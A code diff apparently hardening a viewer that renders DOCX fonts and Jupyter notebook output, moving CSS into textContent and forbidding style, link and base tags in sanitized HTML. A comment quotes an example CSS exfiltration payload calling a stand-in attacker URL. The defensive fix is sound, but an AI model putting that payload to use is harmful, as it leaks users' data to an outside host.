@@ -140,10 +140,17 @@ async function renderDocx(path: string, host: HTMLElement, daemon: DaemonClient)
   // is already restricted to a safe character set.
   const famAttr = fonts.family ? ` style="font-family:'${fonts.family}',var(--font-sans)"` : "";
   host.innerHTML =
-    (fonts.css ? `<style>${fonts.css}</style>` : "") +
     `<article class="rich-doc"${famAttr}>` +
     DOMPurify.sanitize(value || '<p class="rich-msg">This document is empty.</p>') +
     "</article>";
+  // Inject the embedded @font-face CSS via a <style> element's textContent (NOT an
+  // innerHTML string), so the untrusted font family/bytes can never break out of
+  // the CSS context into markup.
+  if (fonts.css) {
+    const style = document.createElement("style");
+    style.textContent = fonts.css;
+    host.prepend(style);
+  }
 }
 
 // ── Jupyter notebook (.ipynb) ───────────────────────────────────────────────
@@ -215,7 +222,14 @@ async function renderIpynb(path: string, host: HTMLElement, daemon: DaemonClient
     })
     .join("");
 
-  host.innerHTML = DOMPurify.sanitize(`<div class="nb-doc">${body || '<div class="rich-msg">This notebook is empty.</div>'}</div>`);
+  // FORBID <style>/<link>/<base>: a notebook's `text/html` output is untrusted
+  // vault content and DOMPurify allows <style> by default — a crafted cell could
+  // inject `<style>…content:url(https://attacker/steal)…</style>` and exfiltrate
+  // via CSS, or a <link>/<base> to hijack styling/navigation.
+  host.innerHTML = DOMPurify.sanitize(
+    `<div class="nb-doc">${body || '<div class="rich-msg">This notebook is empty.</div>'}</div>`,
+    { FORBID_TAGS: ["style", "link", "base"] },
+  );
   // highlight + line-number the code cells with the shared post-processor
   const { enhanceCodeBlocksIn } = await import("./codeblock");
   await enhanceCodeBlocksIn(host);
